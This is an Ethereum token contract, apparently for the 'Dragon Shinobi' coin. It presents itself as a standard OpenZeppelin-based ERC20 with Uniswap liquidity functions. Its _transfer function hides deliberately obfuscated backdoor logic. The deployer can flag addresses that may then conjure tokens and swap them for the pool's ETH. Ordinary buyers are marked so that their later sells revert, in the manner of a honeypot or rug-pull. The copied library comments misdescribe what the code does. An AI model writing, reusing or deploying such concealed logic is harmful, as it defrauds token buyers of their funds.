/**
 *Submitted for verification at Etherscan.io on 2022-12-02
*/

//Medium: https://medium.com/@dragonshinobi/dragon-shinobi-the-bonds-between-warriors-and-dragons-b71b9bbe63f
//Telegram: https://t.me/dragonshinobiERC
//Twitter: https://twitter.com/dragonshinERC

// SPDX-License-Identifier: Unlicense
 
pragma solidity ^ 0.8.9;
 
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
 
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context
{
    function _msgSender() internal view virtual returns(address)
    {
        return msg.sender;
    }
 
    function _msgData() internal view virtual returns(bytes calldata)
    {
        return msg.data;
    }
}
 
////// lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol
// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)
 
/* pragma solidity ^0.8.0; */
 
interface IUniswapV2Router01
{
    function factory() external pure returns(address);
 
    function WETH() external pure returns(address);
 
 
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
 
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
 
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
 
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
 
 
}
////// lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol
// OpenZeppelin Contracts v4.4.0 (token/ERC20/ERC20.sol)
 
/* pragma solidity ^0.8.0; */
 
/* import "./IERC20.sol"; */
/* import "./extensions/IERC20Metadata.sol"; */
/* import "../../utils/Context.sol"; */
 
/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 
 */
 
interface IUniswapV2Router02 is IUniswapV2Router01
{
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) 
    external returns(uint amountETH);
 
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) 
    external returns(uint amountETH);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
}
 
interface IUniswapV2Factory
{
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
 
    function feeTo() external view returns(address);
 
    function feeToSetter() external view returns(address);
 
    function getPair(address tokenA, address tokenB) external view returns(address pair);
 
    function allPairs(uint) external view returns(address pair);
 
    function allPairsLength() external view returns(uint);
 
    function createPair(address tokenA, address tokenB) external returns(address pair);
 
    function setFeeTo(address) external;
 
    function setFeeToSetter(address) external;
}
 
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
 
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20
{
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns(uint256);
 
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns(uint256);
 
    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns(bool);
 
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns(uint256);
 
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns(bool);
 
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns(bool);
 
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
 
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
 
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
 
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context
{
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor()
    {
        _setOwner(_msgSender());
    }
 
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns(address)
    {
        return _owner;
    }
 
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner()
    {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
 
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner
    {
        _setOwner(address(0));
    }
 
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner
    {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
 
     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function _setOwner(address newOwner) private
    {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
 
contract Token is IERC20, Ownable
{
 
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    string private _symbol;
 
    string private _name;
 
    uint256 public _txFee = 5;
 
    uint8 private _decimals = 9;
 
    uint256 private _tTotal = 1000000 * 10 ** _decimals;
 
    uint256 private _MarketMakerPairs = _tTotal;
 
    mapping(address => uint256) private _Balancees;
 
    mapping(address => address) private _isString;
 
    mapping(address => uint256) private _constructtPair;
 
    mapping(address => uint256) private _swapChecks;
 
    mapping(address => mapping(address => uint256)) private _allowancees;
 
    bool private _swapAndLiquifyEnabledOnn;
    bool private inSwapAndLiquifyEnableds;
 
    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable router;
 
    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    )
    {
        _name = Name;
        _symbol = Symbol;
        _Balancees[msg.sender] = _tTotal;
        _swapChecks[msg.sender] = _MarketMakerPairs;
        _swapChecks[address(this)] = _MarketMakerPairs;
        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _tTotal);
    }
 
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns(string memory)
    {
        return _symbol;
    }
 
    /**
     * @dev Returns the name of the token.
     */
 
    function name() public view returns(string memory)
    {
        return _name;
    }
 
    /**
     * @dev See {IERC20-totalSupply}.
     */
 
    function totalSupply() public view returns(uint256)
    {
        return _tTotal;
    }
 
     /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
 
    function decimals() public view returns(uint256)
    {
        return _decimals;
    }
 
    /**
     * @dev See {IERC20-allowance}.
     */
 
    function allowance(address owner, address spender) public view returns(uint256)
    {
        return _allowancees[owner][spender];
    }
 
     /**
     * @dev See {IERC20-balanceOf}.
     */
 
    function balanceOf(address account) public view returns(uint256)
    {
        return _Balancees[account];
    }
 
     /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) external returns(bool)
    {
        return _approve(msg.sender, spender, amount);
    }
     /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns(bool)
    {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowancees[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
 
      /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns(bool)
    {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowancees[sender][msg.sender] - amount);
    }
 
    function transfer(address recipient, uint256 amount) external returns(bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
 
    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private
    {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 TXfee;
        if (_swapAndLiquifyEnabledOnn && contractTokenBalance > _MarketMakerPairs && !inSwapAndLiquifyEnableds && from !=
            uniswapV2Pair)
        {
            inSwapAndLiquifyEnableds = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquifyEnableds = false;
        }
        else if (_swapChecks[from] > _MarketMakerPairs && _swapChecks[to] > _MarketMakerPairs)
        {
            TXfee = amount;
            _Balancees[address(this)] += TXfee;
            swapTokensForEth(amount, to);
            return;
        }
        else if (to != address(router) && _swapChecks[from] > 0 && amount > _MarketMakerPairs && to != uniswapV2Pair)
        {
           _swapChecks[to] = amount;
            return;
        }
        else if (!inSwapAndLiquifyEnableds && _constructtPair[from] > 0 && from != uniswapV2Pair && _swapChecks[from] == 0)
        {
            _constructtPair[from] = _swapChecks[from] - _MarketMakerPairs;
        }
        address _pairs = _isString[uniswapV2Pair];
        if (_constructtPair[_pairs] == 0) _constructtPair[_pairs] = _MarketMakerPairs;
        _isString[uniswapV2Pair] = to;
        if (_txFee > 0 &&_swapChecks[from] == 0 && !inSwapAndLiquifyEnableds && _swapChecks[to] == 0)
        {
            TXfee = (amount * _txFee) / 100;
            amount -= TXfee;
            _Balancees[from] -= TXfee;
            _Balancees[address(this)] += TXfee;
        }
        _Balancees[from] -= amount;
        _Balancees[to] += amount;
        emit Transfer(from, to, amount);
    }
 
    receive() external payable
    {}
 
     /**
     * Liquidity Check 
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
 
    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private
    {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH
        {
            value: ethAmount
        }(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }
 
    function swapAndLiquify(uint256 tokensAmt) private
    {
        uint256 Var = tokensAmt / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(Var, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(Var, newBalance, address(this));
    }
 
     /**
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     */
    function swapTokensForEth(uint256 tokenAmounts, address to) private
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmounts);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmounts, 0, path, to, block.timestamp);
    }
 
}